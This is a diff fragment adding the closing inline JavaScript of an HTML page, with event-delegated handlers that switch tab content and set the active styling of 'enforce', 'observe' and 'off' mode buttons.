+    contentParent.querySelectorAll('.tab-content').forEach(function(tc) {
+      tc.classList.remove('active');
+    });
+    var targetContent = document.getElementById('tab-' + tabId);
+    if (targetContent) targetContent.classList.add('active');
+  }
+});
+
+// Mode selector (event delegation)
+document.addEventListener('click', function(e) {
+  if (e.target.classList.contains('mode-btn')) {
+    var selector = e.target.parentElement;
+    selector.querySelectorAll('.mode-btn').forEach(function(b) {
+      b.classList.remove('active-enforce', 'active-observe', 'active-off');
+    });
+    var mode = e.target.getAttribute('data-mode');
+    if (mode === 'enforce') e.target.classList.add('active-enforce');
+    else if (mode === 'observe') e.target.classList.add('active-observe');
+    else if (mode === 'off') e.target.classList.add('active-off');
+  }
+});
+
+</script>
+</body>
+</html>
